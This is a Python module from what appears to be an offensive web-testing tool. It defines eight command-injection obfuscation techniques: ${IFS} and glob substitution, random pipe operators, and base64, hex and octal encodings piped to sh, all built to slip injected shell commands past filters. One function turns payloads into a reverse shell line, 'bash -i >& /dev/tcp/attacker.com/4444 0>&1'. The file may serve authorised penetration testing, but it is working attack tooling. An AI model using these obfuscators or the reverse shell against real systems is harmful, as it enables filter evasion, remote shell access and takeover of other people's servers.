# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.

"""CMDi obfuscation techniques (8 total)."""
from __future__ import annotations

import base64
import random
import re

from hdwp.core.payloads.obfuscation.obfuscator_registry import ObfuscationTechnique


def _variable_expansion(payload: str) -> str:
    """Utilise variables bash ${IFS}, $9."""
    return payload.replace(" ", "${IFS}").replace(";", "$9;")


def _glob_patterns(payload: str) -> str:
    """Remplace caractères par glob patterns."""
    return payload.replace("id", "i?").replace("cat", "c*t")


def _command_substitution(payload: str) -> str:
    """Alterne backticks et $() pour substitution."""
    return re.sub(r'`([^`]+)`', r'$(\1)', payload)


def _pipe_alternatives(payload: str) -> str:
    """Alterne pipes |, ||, &&."""
    pipes = ["|", "||", "&&"]
    return re.sub(r'\|', lambda m: random.choice(pipes), payload)


def _base64_encoding(payload: str) -> str:
    """Encode commande en base64 + decode shell."""
    encoded = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded} | base64 -d | sh"


def _hex_encoding(payload: str) -> str:
    """Encode commande en hex \\x format."""
    hex_str = "".join(f"\\x{ord(c):02x}" for c in payload)
    return f"echo -e '{hex_str}' | sh"


def _octal_encoding(payload: str) -> str:
    """Encode commande en octal \\0 format."""
    octal_str = "".join(f"\\{ord(c):03o}" for c in payload)
    return f"echo -e '{octal_str}' | sh"


def _reverse_shell(payload: str) -> str:
    """Transforme en reverse shell pattern."""
    if "id" in payload or "whoami" in payload:
        return "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
    return payload


# Liste exportée
CMDI_OBFUSCATORS = [
    ObfuscationTechnique("cmdi_variable_expansion", "cmdi", _variable_expansion, "Variables bash ${IFS}", complexity=1),
    ObfuscationTechnique("cmdi_glob_patterns", "cmdi", _glob_patterns, "Glob patterns i?, c*t", complexity=2),
    ObfuscationTechnique("cmdi_command_substitution", "cmdi", _command_substitution, "Backticks -> $()", complexity=1),
    ObfuscationTechnique("cmdi_pipe_alternatives", "cmdi", _pipe_alternatives, "|, ||, && aléatoires", complexity=1),
    ObfuscationTechnique("cmdi_base64_encoding", "cmdi", _base64_encoding, "Base64 + decode shell", complexity=3),
    ObfuscationTechnique("cmdi_hex_encoding", "cmdi", _hex_encoding, "Hex \\x encoding", complexity=3),
    ObfuscationTechnique("cmdi_octal_encoding", "cmdi", _octal_encoding, "Octal \\0 encoding", complexity=3),
    ObfuscationTechnique("cmdi_reverse_shell", "cmdi", _reverse_shell, "Reverse shell pattern", complexity=5),
]
